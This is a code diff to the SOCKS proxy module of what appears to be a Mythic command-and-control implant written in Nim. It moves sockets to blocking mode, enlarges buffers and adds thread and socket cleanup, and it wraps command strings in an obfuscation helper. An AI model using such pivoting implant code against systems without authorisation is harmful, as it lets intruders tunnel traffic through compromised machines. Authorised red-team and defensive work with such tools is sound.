@@ -19,7 +19,7 @@ const
   COMMAND_NOT_SUPPORTED = 0x07'u8
   ADDR_TYPE_NOT_SUPPORTED = 0x08'u8
   
-  BUFFER_SIZE = 4096
+  BUFFER_SIZE = 65536
   SLEEP_INTERVAL_MS = 0  # Use cpuRelax() for minimal latency
 
 type
@@ -81,6 +81,7 @@ proc createSocksMessage*(serverId: uint32, exit: bool, data: string = "", port: 
 
 proc readFromDestination(conn: ptr SocksConnectionObj) {.thread.} =
   ## Thread that reads from remote socket and sends to Mythic via main thread
+  ## Uses blocking recv - thread blocks until data arrives or socket is closed
   var buffer = newSeq[byte](BUFFER_SIZE)
   
   while conn[].active:
@@ -88,32 +89,23 @@ proc readFromDestination(conn: ptr SocksConnectionObj) {.thread.} =
       let bytesRead = conn[].socket.recv(addr buffer[0], BUFFER_SIZE)
       
       if bytesRead == 0:
-        # Connection closed by remote
+        # Connection closed by remote (EOF)
         conn[].active = false
-        # Signal EOF
         conn[].outChannel[].send(@[])
         break
       elif bytesRead > 0:
         # Send data to main thread for forwarding to Mythic
         conn[].outChannel[].send(buffer[0..<bytesRead])
-      elif bytesRead < 0:
-        # Non-blocking socket would block - no data available
-        sleep(1)  # Sleep 1ms to avoid busy-waiting
       
     except:
-      # Socket error - connection closed or reset
+      # Socket error - connection closed, reset, or shut down by us
       conn[].active = false
       conn[].outChannel[].send(@[])
       break
-  
-  # Thread exiting - close socket if still open
-  try:
-    conn[].socket.close()
-  except:
-    discard
 
 proc writeToDestination(conn: ptr SocksConnectionObj) {.thread.} =
   ## Thread that receives data from Mythic and writes to remote socket
+  ## Uses blocking send - ensures all data is written before proceeding
   while conn[].active:
     let (available, data) = conn[].inChannel[].tryRecv()
     if available and data.len > 0:
@@ -124,21 +116,9 @@ proc writeToDestination(conn: ptr SocksConnectionObj) {.thread.} =
           if bytesSent > 0:
             sent += bytesSent
           else:
-            # send returned 0 on non-blocking socket, yield and retry
-            sleep(1)  # Sleep 1ms to avoid busy-waiting
-        except OSError as e:
-          # Treat EWOULDBLOCK/WSAEWOULDBLOCK as congestion, yield and retry
-          when defined(windows):
-            const WsaWouldBlock = 10035'i32
-            if e.errorCode.int32 == WsaWouldBlock:
-              sleep(1)  # Sleep 1ms to avoid busy-waiting
-              continue
-          else:
-            const EwouldBlock = 11'i32
-            if e.errorCode.int32 == EwouldBlock:
-              sleep(1)  # Sleep 1ms to avoid busy-waiting
-              continue
-          # Any other error closes the connection
+            sleep(1)
+        except:
+          # Socket error - connection closed or reset
           conn[].active = false
           break
     else:
@@ -291,8 +271,9 @@ proc handleNewConnection(serverId: uint32, data: seq[byte]): seq[JsonNode] =
     # Disable Nagle's algorithm for better interactive protocol performance (RDP, SSH, etc)
     socket.setSockOpt(OptNoDelay, true, level = IPPROTO_TCP.cint)
     
-    # Set non-blocking mode
-    socket.getFd().SocketHandle.setBlocking(false)
+    # Keep socket in blocking mode - reader/writer threads are dedicated per-connection
+    # Blocking recv in reader thread is correct: blocks until data arrives or socket closes
+    # Blocking send in writer thread is correct: ensures complete data delivery
     
     # Get local address for reply
     let (localAddr, localPort) = socket.getLocalAddr()
@@ -366,11 +347,14 @@ proc socks*(taskId: string, params: JsonNode): JsonNode =
     of obf("stop"):
       socksActive = false
       
-      # Close all connections
+      # Close all connections - set active=false and close sockets to unblock threads
       for serverId, conn in activeSocksConnections:
         conn.active = false
+        if not conn.sharedPtr.isNil:
+          conn.sharedPtr.active = false
         if conn.state == Connected:
-          conn.socket.close()
+          try: conn.socket.close()
+          except: discard
       
       activeSocksConnections.clear()
       
@@ -396,13 +380,17 @@ proc handleSocksMessages*(messages: seq[JsonNode]): seq[JsonNode] =
     debug &"[DEBUG] SOCKS: Message for connection {serverId}, exit={exit}"
     
     if exit:
-      # Mark connection for closure (don't delete immediately - let threads finish)
+      # Mark connection for closure and close socket to unblock reader thread
       if activeSocksConnections.hasKey(serverId):
         var conn = activeSocksConnections[serverId]
         # Set active=false in BOTH the ref object and the shared object
         conn.active = false
         if not conn.sharedPtr.isNil:
           conn.sharedPtr.active = false
+        # Close socket to interrupt blocking recv in reader thread
+        if conn.state == Connected:
+          try: conn.socket.close()
+          except: discard
         debug &"[DEBUG] SOCKS: Marked connection {serverId} for cleanup (reader will drain remaining data)"
       continue
     
@@ -487,7 +475,11 @@ proc checkActiveSocksConnections*(): seq[JsonNode] =
     if activeSocksConnections.hasKey(serverId):
       let conn = activeSocksConnections[serverId]
       if conn.state == Connected:
-        # Join threads first
+        # Close socket first to unblock any blocking recv/send in threads
+        try: conn.socket.close()
+        except: discard
+        
+        # Join threads (they should exit quickly now that socket is closed)
         try:
           joinThread(conn.readerThread)
         except:
@@ -500,5 +492,15 @@ proc checkActiveSocksConnections*(): seq[JsonNode] =
         # Free shared memory used by threads
         if not conn.sharedPtr.isNil:
           deallocShared(conn.sharedPtr)
+        
+        # Free channels
+        try:
+          conn.inChannel[].close()
+          deallocShared(conn.inChannel)
+        except: discard
+        try:
+          conn.outChannel[].close()
+          deallocShared(conn.outChannel)
+        except: discard
     activeSocksConnections.del(serverId)
     debug &"[DEBUG] SOCKS: Deleted inactive connection {serverId}"
